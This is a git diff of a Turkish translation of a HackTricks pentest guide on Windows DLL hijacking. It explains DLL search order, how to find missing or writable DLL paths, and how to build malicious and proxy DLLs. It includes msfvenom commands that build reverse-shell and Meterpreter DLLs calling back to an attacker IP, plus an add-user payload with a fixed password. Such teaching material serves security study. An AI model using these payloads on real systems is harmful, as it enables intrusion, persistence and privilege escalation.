@@ -1,100 +1,100 @@
-# Dll Hijacking
+# Dll Korsanlığı
 
 <details>
 
-<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>
+<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme becerilerini öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
 * [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
-* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** katkıda bulunun.
+* **Bize katılın** 💬 [**Discord grubunda**](https://discord.gg/hRep4RUj7f) veya [**telegram grubunda**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-Eğer **hackleme kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı bir şekilde Lehçe yazılı ve sözlü dil bilgisi gereklidir_).
+**Ödül avı ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafından oluşturulan bir premium **ödül avı platformu**! Bugün [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinde bize katılın ve **100.000 $'a kadar ödüller kazanmaya başlayın**!
 
-{% embed url="https://www.stmcyber.com/careers" %}
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Temel Bilgiler
 
-DLL Hijacking, güvenilir bir uygulamanın kötü niyetli bir DLL'i yüklemesini sağlamak için manipülasyon yapmayı içerir. Bu terim, **DLL Sahteciliği, Enjeksiyonu ve Yan Yükleme** gibi birkaç taktiği kapsar. Temel olarak, kod yürütme, kalıcılık sağlama ve daha az yaygın olarak ayrıcalık yükseltme için kullanılır. Burada ayrıcalık yükseltmeye odaklanmamıza rağmen, DLL'nin ele geçirilme yöntemi hedeflere bağlı olarak tutarlı kalır.
+DLL Korsanlığı, güvenilen bir uygulamanın kötü amaçlı bir DLL yüklemesine manipülasyon yapmayı içerir. Bu terim, **DLL Sahteciliği, Enjeksiyon ve Yan Yükleme** gibi birkaç taktiği kapsar. Genellikle kod yürütme, kalıcılık sağlama ve daha az yaygın olarak ayrıcalık yükseltme amacıyla kullanılır. Buradaki odak ayrıcalık yükseltme olsa da, korsanlığın yöntemi hedeflere göre tutarlı kalır.
 
 ### Yaygın Teknikler
 
-DLL hijacking için birkaç yöntem kullanılır ve her birinin etkinliği, uygulamanın DLL yükleme stratejisine bağlıdır:
+DLL korsanlığı için birkaç yöntem kullanılır ve her birinin etkinliği, uygulamanın DLL yükleme stratejisine bağlıdır:
 
-1. **DLL Değiştirme**: Gerçek bir DLL'i kötü niyetli bir DLL ile değiştirme, isteğe bağlı olarak DLL Proxying kullanarak orijinal DLL'in işlevselliğini koruma.
-2. **DLL Arama Sırası Kötüye Kullanımı**: Kötü niyetli DLL'i, uygulamanın arama desenini sömürerek, meşru olanın önünde bir arama yoluna yerleştirme.
-3. **Hayalet DLL Hijacking**: Bir uygulamanın yüklemesi için gereken olmayan bir DLL olduğunu düşünerek, yüklenmesi için kötü niyetli bir DLL oluşturma.
-4. **DLL Yönlendirme**: Arama parametrelerini (%PATH%) veya .exe.manifest / .exe.local dosyalarını değiştirerek uygulamayı kötü niyetli DLL'ye yönlendirme.
-5. **WinSxS DLL Değiştirme**: WinSxS dizinindeki meşru DLL'yi kötü niyetli bir karşılıkla değiştirme, genellikle DLL yan yükleme ile ilişkilendirilen bir yöntem.
-6. **İlgili Yol DLL Hijacking**: Kötü niyetli DLL'yi, ikili proxy yürütme tekniklerini andıran bir kullanıcı tarafından kontrol edilen bir dizine kopyalanan uygulama ile birlikte yerleştirme.
+1. **DLL Değiştirme**: Gerçek bir DLL'yi kötü amaçlı bir DLL ile değiştirme, isteğe bağlı olarak orijinal DLL'in işlevselliğini korumak için DLL Proxying kullanma.
+2. **DLL Arama Sırası Korsanlığı**: Kötü niyetli DLL'yi meşru olanın önünde bir arama yoluna yerleştirerek, uygulamanın arama desenini sömürme.
+3. **Hayalet DLL Korsanlığı**: Bir uygulamanın yüklemesi için bir gereksinim olmayan bir DLL olduğunu düşünerek yüklenmesi için kötü amaçlı bir DLL oluşturma.
+4. **DLL Yönlendirme**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` gibi arama parametrelerini değiştirme.
+5. **WinSxS DLL Değiştirme**: Meşru bir DLL'yi WinSxS dizinindeki kötü niyetli bir karşılıkla değiştirme, genellikle DLL yan yükleme ile ilişkilendirilen bir yöntem.
+6. **Göreceli Yol DLL Korsanlığı**: Kötü niyetli DLL'yi, Kopyalanan uygulama ile kullanıcı tarafından kontrol edilen bir dizine yerleştirerek, Binary Proxy Execution tekniklerini andıran bir yöntem.
 
 ## Eksik Dll'leri Bulma
 
-Sistem içinde eksik Dll'leri bulmanın en yaygın yolu, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) uygulamasını sysinternals'ten çalıştırmaktır. **Aşağıdaki 2 filtre**'yi **ayarlayarak**:
+Bir sistem içinde eksik Dll'leri bulmanın en yaygın yolu [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) uygulamasını çalıştırmaktır, **aşağıdaki 2 filtre**yi **ayarlayarak**:
 
 ![](<../../.gitbook/assets/image (311).png>)
 
 ![](<../../.gitbook/assets/image (313).png>)
 
-ve sadece **Dosya Sistemi Etkinliği**'ni gösterin:
+ve sadece **Dosya Sistem Etkinliği'ni** gösterin:
 
 ![](<../../.gitbook/assets/image (314).png>)
 
-**Genel olarak eksik dll'leri bulmak** için bunu birkaç **saniye** çalıştırabilirsiniz.\
-**Belirli bir yürütülebilir içinde eksik bir dll arıyorsanız**, **"Process Name" "contains" "\<exec name>"** gibi **başka bir filtre** ayarlamanız ve etkinlikleri yakalamayı **durdurmanız** gerekmektedir.
+**Genel olarak eksik dll'leri bulmak** için bunu birkaç **saniye** çalışır bırakabilirsiniz.\
+**Belirli bir yürütülebilir içindeki eksik dll'leri arıyorsanız** "İşlem Adı" "içerir" "<yürütülebilir adı>" gibi **başka bir filtre ayarlamanız** gerekmektedir, çalıştırın ve olayları yakalamayı durdurun.
 
 ## Eksik Dll'leri Sömürme
 
-Ayrıcalıkları yükseltmek için en iyi şansımız, bir ayrıcalık sürecinin **yüklemeye çalışacağı bir dll yazabilmek**. Bunun için, orijinal dll'nin olduğundan **önce aranacak bir klasöre** (garip bir durum) veya dll'nin aranacağı bir klasöre **yazabiliriz** ve orijinal **dll hiçbir klasörde bulunmaz**.
+Ayrıcalıkları yükseltmek için en iyi şansımız, bir ayrıcalık sürecinin yüklemeye çalışacağı **bir dll yazabilmek** ve **arama yapılacak bir yerde** olmasını sağlamaktır. Bu nedenle, orijinal DLL'nin olduğundan **önce aranacak bir klasöre** kötü niyetli bir DLL yazabileceğiz (garip durum), veya **arama yapılacak bir yere** yazabileceğiz ve orijinal **dll hiçbir klasörde bulunmuyorsa**.
 
 ### Dll Arama Sırası
 
-**Microsoft belgeleri içinde** [**Dll'lerin özel olarak nasıl yüklendiğini**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **bulabilirsiniz**.
+**[Microsoft belgeleri içinde](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) Dll'lerin özellikle nasıl yüklendiğini bulabilirsiniz.**
 
-**Windows uygulamaları**, belirli bir sıraya uyan **önceden tanımlanmış arama yollarını** takip ederek DLL'leri arar. DLL hijacking sorunu, zararlı bir DLL'nin stratejik olarak bu dizinlerden birine yerleştirilmesi ve otantik DLL'den önce yüklenmesinin sağlanmasıyla ortaya çıkar. Bunu önlemek için uygulamanın DLL'lere başvururken mutlak yolları kullanmasını sağlamak önemlidir.
+**Windows uygulamaları**, belirli bir sıraya uyan **önceden tanımlanmış arama yollarını** takip ederek DLL'leri arar. DLL korsanlığı sorunu, zararlı bir DLL'nin stratejik olarak bu dizinlerden birine yerleştirilmesi ve otantik DLL'den önce yüklenmesinin sağlanmasıyla ortaya çıkar. Bunu önlemenin bir yolu, uygulamanın ihtiyaç duyduğu DLL'leri belirtirken mutlak yolları kullanmasını sağlamaktır.
 
 32-bit sistemlerde **DLL arama sırasını** aşağıda görebilirsiniz:
 
 1. Uygulamanın yüklendiği dizin.
-2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) işlevini kullanın. (_C:\Windows\System32_)
-3. 16-bit sistem dizini. Bu dizinin yolunu almak için bir işlev yoktur, ancak aranır. (_C:\Windows\System_)
+2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) işlevini kullanın.(_C:\Windows\System32_)
+3. 16-bit sistem dizini. Bu dizinin yolunu alacak bir işlev yoktur, ancak aranır. (_C:\Windows\System_)
 4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) işlevini kullanın. (_C:\Windows_)
 5. Geçerli dizin.
-6. PATH ortam değişkeninde listelenen dizinler. Bu, **App Paths** kaydı tarafından belirtilen uygulama başına yol dahil edilmez. DLL arama yolu hesaplanırken **App Paths** anahtarı kullanılmaz.
+6. PATH ortam değişkeninde listelenen dizinler. Bu, **App Paths** kaydında belirtilen uygulama özel yolunu içermez. **App Paths** anahtarı, DLL arama yolunu hesaplarken kullanılmaz.
 
-Bu, **SafeDllSearchMode** etkin olduğunda **varsayılan** arama sırasıdır. Bu özelliği devre dışı bırakmak için **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt defteri değerini oluşturun ve 0 olarak ayarlayın (varsayılan olarak etkin).
+Bu, **SafeDllSearchMode** etkin olduğunda varsayılan arama sırasıdır. Bu özelliği devre dışı bırakmak için **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt değerini oluşturun ve 0 olarak ayarlayın (varsayılan etkindir).
 
-[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) işlevi **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** ile çağrıldığında, arama, **LoadLibraryEx**'in yüklediği yürütülebilir modül dizininde başlar.
+[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) işlevi **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** ile çağrıldığında, arama **LoadLibraryEx**'in yüklediği yürütülebilir modül dizininde başlar.
 
-Son olarak, **bir dll, sadece adıyla yüklenmiş gibi aranabilir**. Bu durumda, dll **yalnızca o yolda aranacak** (dll'nin bağımlılıkları varsa, sadece adıyla aranacaklar).
+Son olarak, **bir dll yalnızca adı yerine mutlak yol belirtilerek yüklenebilir**. Bu durumda, bu dll **yalnızca o yolda aranacak**tır (dll'nin bağımlılıkları varsa, bunlar sadece adıyla aranacaktır).
 
-Arama sırasını değiştirmenin başka yolları da vardır, ancak bun
-#### Windows belgelerindeki dll arama sırasındaki istisnalar
+Arama sırasını değiştirmenin başka yolları da vardır ancak burada açıklamayacağım.
+#### Windows belgelerinden dll arama sırasındaki istisnalar
 
-Windows belgelerinde, standart DLL arama sırasına bazı istisnalar belirtilmiştir:
+Windows belgelerinde standart DLL arama sırasına belirli istisnalar bulunmaktadır:
 
-- Bellekte zaten yüklenmiş olan bir DLL ile aynı ismi paylaşan bir DLL ile karşılaşıldığında, sistem normal aramayı atlar. Bunun yerine, DLL'nin bellekte zaten bulunan DLL'ye yönlendirme ve bir manifest kontrolü yapar. Bu senaryoda, sistem DLL için bir arama yapmaz.
-- DLL, mevcut Windows sürümü için bir "bilinen DLL" olarak tanınıyorsa, sistem bilinen DLL'nin sürümünü ve bağımlı DLL'lerini kullanır ve arama sürecini atlar. Bu bilinen DLL'lerin listesi, **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kayıt defteri anahtarında tutulur.
-- Bir DLL'nin bağımlılıkları varsa, bağımlı DLL'lerin araması, başlangıçta DLL'nin tam yolunu belirtilse bile, yalnızca "modül adları" ile gösterildiği gibi yapılır.
+* Bellekte zaten yüklenmiş bir DLL ile **adını paylaşan bir DLL** ile karşılaşıldığında, sistem normal aramayı atlar. Bunun yerine, yönlendirme ve bir manifest kontrolü yapar ve ardından varsayılan olarak bellekte zaten bulunan DLL'ye geçer. **Bu senaryoda, sistem DLL için bir arama yapmaz**.
+* DLL'nin mevcut Windows sürümü için bir **tanınmış DLL** olarak tanındığı durumlarda, sistem tanınmış DLL'nin sürümünü ve bağımlı DLL'lerini kullanır ve **arama sürecini atlar**. **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kayıt anahtarı bu tanınmış DLL'lerin listesini tutar.
+* Bir **DLL'nin bağımlılıkları** varsa, bağımlı DLL'lerin araması, başlangıçta DLL'nin tam yolundan tanımlanmış olup olmadığına bakılmaksızın, yalnızca **modül adları** ile belirtildiği gibi yapılır.
 
-### İzinleri Yükseltme
+### Yetkilerin Yükseltilmesi
 
 **Gereksinimler**:
 
-- **Farklı ayrıcalıklarla** çalışan veya çalışacak bir işlemi belirleyin (yatay veya yan hareket), **bir DLL eksik** olsun.
-- **DLL'nin aranacağı** herhangi bir **dizin** için **yazma erişimi** mevcut olduğundan emin olun. Bu konum, yürütülebilir dosyanın dizini veya sistem yolundaki bir dizin olabilir.
+* **Farklı yetkiler altında çalışan bir işlemi belirleyin veya belirleyin** (yatay veya dikey hareket), **bir DLL'yi eksik olan**.
+* **DLL'nin aranacağı herhangi bir dizinde** **yazma erişimi** mevcut olduğundan emin olun. Bu konum, yürütülebilir dosyanın dizini veya sistem yolundaki bir dizin olabilir.
 
-Evet, gereksinimlerin bulunması zordur çünkü **varsayılan olarak ayrıcalıklı bir yürütülebilirin eksik bir dll'ye sahip olması tuhaf** ve **sistem yolunda bir klasöre yazma izinlerine sahip olmak daha da tuhaftır** (varsayılan olarak yapamazsınız). Ancak, yanlış yapılandırılmış ortamlarda bu mümkündür.\
-Eğer şanslıysanız ve gereksinimleri karşıladığınızı bulursanız, [UACME](https://github.com/hfiref0x/UACME) projesini kontrol edebilirsiniz. Projenin **ana amacı UAC'yi atlatmak** olsa da, yazma izinlerine sahip olduğunuz klasörün yolunu değiştirerek kullanabileceğiniz bir Windows sürümü için bir Dll hijacking PoC'si bulabilirsiniz.
+Evet, gereksinimlerin **varsayılan olarak ayrıcalıklı bir yürütülebilir dosyanın eksik bir dll'ye sahip olması oldukça garip olduğu için zor bulunması** ve hatta **sistem yolunda bir klasöre yazma izinlerine sahip olmanız daha da garip** (varsayılan olarak yapamazsınız). Ancak, yanlış yapılandırılmış ortamlarda bu mümkündür.\
+Gereksinimleri karşıladığınızı ve şanslı olduğunuzu bulursanız, [UACME](https://github.com/hfiref0x/UACME) projesini kontrol edebilirsiniz. Projenin **ana amacı UAC'yi atlatmak** olsa da, muhtemelen yazma izinlerine sahip olduğunuz bir klasör yolunu değiştirerek kullanabileceğiniz bir Windows sürümü için bir Dll ele geçirme **PoC** bulabilirsiniz.
 
-Bir klasördeki izinlerinizi kontrol edebilirsiniz:
+Bir klasördeki **izinlerinizi kontrol edebilirsiniz** yaparak:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
@@ -103,12 +103,12 @@ Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-Ayrıca, bir yürütülebilir dosyanın içe aktarımlarını ve bir DLL'nin dışa aktarımlarını kontrol edebilirsiniz:
+Ayrıca, bir yürütülebilir dosyanın içe aktarmalarını ve bir dll'nin dışa aktarmalarını şu şekilde kontrol edebilirsiniz:
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-**Ayrıcalıkları yükseltmek için Dll Hijacking'i kötüye kullanma** konusunda tam bir kılavuz için, bir **Sistem Yolu klasörüne yazma izinleri** olan bir klasörde yazma izinlerinizin olup olmadığını kontrol etmek için şu adrese bakın:
+**Dll Hijacking kötüye kullanarak ayrıcalıkları yükseltme** kılavuzunun tamamı için, **Sistem Yolu klasörüne yazma izinleri** kontrol edin:
 
 {% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
 [writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
@@ -116,21 +116,21 @@ dumpbin /export /path/file.dll
 
 ### Otomatik araçlar
 
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), sistem YOLU içindeki herhangi bir klasörde yazma izinlerinizin olup olmadığını kontrol eder.\
-Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar **PowerSploit fonksiyonları**'dır: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), sistem YOLU içinde herhangi bir klasöre yazma izniniz olup olmadığını kontrol edecektir.\
+Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar **PowerSploit fonksiyonları**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_.
 
 ### Örnek
 
-Sömürülebilir bir senaryo bulduğunuzda, başarıyla sömürmek için en önemli şeylerden biri, **yürütülebilir dosyanın içe aktaracağı tüm işlevleri en azından dışa aktaran bir dll oluşturmaktır**. Her durumda, Dll Hijacking, Orta Bütünlük düzeyinden Yüksek **(UAC'yi atlayarak)**'a veya **Yüksek Bütünlükten SİSTEM**'e [yükselmek için kullanışlıdır](../authentication-credentials-uac-and-efs.md#uac). Dll hijacking için odaklanan bu dll hijacking çalışmasında geçerli bir dll oluşturmanın bir örneğini bu adreste bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-Ayrıca, **sonraki bölümde** kullanışlı olabilecek bazı **temel dll kodları** bulabilirsiniz. Bunlar **şablonlar** veya **gereksiz işlevlere sahip bir dll oluşturmak** için kullanılabilir.
+Sömürülebilir bir senaryo bulduğunuzda, başarılı bir şekilde sömürmek için en önemli şeylerden biri, **uygulamanın içe aktaracağı tüm işlevleri en azından dışa aktaran bir dll oluşturmaktır**. Her durumda, Dll Hijacking, [Orta Bütünlük seviyesinden Yüksek **(UAC'yi atlayarak)**'e](../authentication-credentials-uac-and-efs.md#uac) veya [**Yüksek Bütünlük'ten SİSTEM'e**](./#from-high-integrity-to-system)** yükseltmek için kullanışlı olabilir**. **Geçerli bir dll oluşturmanın bir örneğini** bu yürütme için odaklanmış dll hijacking çalışmasında bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Ayrıca, **sonraki bölümde** kullanışlı olabilecek bazı **temel dll kodları** bulabilirsiniz, **şablonlar** oluşturmak veya **gerekli olmayan işlevleri dışa aktaran bir dll oluşturmak** için.
 
 ## **Dll Oluşturma ve Derleme**
 
 ### **Dll Proxifying**
 
-Temel olarak, bir **Dll proxy**, **yüklenirken kötü niyetli kodunuzu yürütebilen** ancak aynı zamanda **gerçek kütüphaneye tüm çağrıları ileten** ve **beklendiği gibi çalışan** bir Dll'dir.
+Temelde bir **Dll proxy**, **yüklendiğinde kötü niyetli kodunuzu yürütebilen ancak aynı zamanda gerçek kütüphaneye tüm çağrıları ileten ve çalışan** bir **Dll'dir**.
 
-[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla, **bir yürütülebilir dosya belirtebilir ve proxify yapmak istediğiniz kütüphaneyi seçebilir** ve **proxify edilmiş bir dll oluşturabilirsiniz** veya **Bir Dll belirtebilir ve proxify edilmiş bir dll oluşturabilirsiniz**.
+[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracı ile bir uygulamayı belirleyebilir ve proxify yapmak istediğiniz kütüphaneyi seçebilir ve **proxify edilmiş bir dll oluşturabilir** veya bir Dll belirleyebilir ve **proxify edilmiş bir dll oluşturabilirsiniz**.
 
 ### **Meterpreter**
 
@@ -138,17 +138,17 @@ Temel olarak, bir **Dll proxy**, **yüklenirken kötü niyetli kodunuzu yürüte
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Meterpreter elde etme (x86):**
+**Meterpreter alın (x86):**
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Kullanıcı oluşturma (x86 için x64 sürümünü görmedim):**
+**Kullanıcı oluştur (x86 bir sürümü görmedim):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
 ### Kendi Dll'iniz
 
-Unutmayın ki birkaç durumda derlediğiniz Dll, hedef süreç tarafından yüklenecek olan birkaç fonksiyonu **ihraç etmelidir**. Bu fonksiyonlar mevcut değilse, **binary onları yükleyemez** ve **saldırı başarısız olur**.
+Unutmayın ki birkaç durumda derlediğiniz Dll, kurban süreç tarafından yüklenecek olan birkaç fonksiyonu **ihraç etmelidir**, eğer bu fonksiyonlar mevcut değilse **binary onları yükleyemez** ve **saldırı başarısız olur**.
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -230,25 +230,26 @@ return TRUE;
 }
 ```
 ## Referanslar
+
 * [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
 * [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-Eğer **hacking kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı bir şekilde Lehçe yazılı ve konuşma becerisi gereklidir_).
+**Hata ödülü ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafından oluşturulan bir premium **hata ödülü platformu**! Bugün bize katılın [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) ve **$100,000**'a kadar ödüller kazanmaya başlayın!
 
-{% embed url="https://www.stmcyber.com/careers" %}
+{% embed url="https://go.intigriti.com/hacktricks" %}
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin<strong>!</strong></summary>
+<summary><strong>Sıfırdan kahraman olana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-HackTricks'i desteklemenin diğer yolları:
+HackTricks'ı desteklemenin diğer yolları:
 
-* Şirketinizi HackTricks'te **reklamınızı yapmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
-* **Hacking hilelerinizi HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
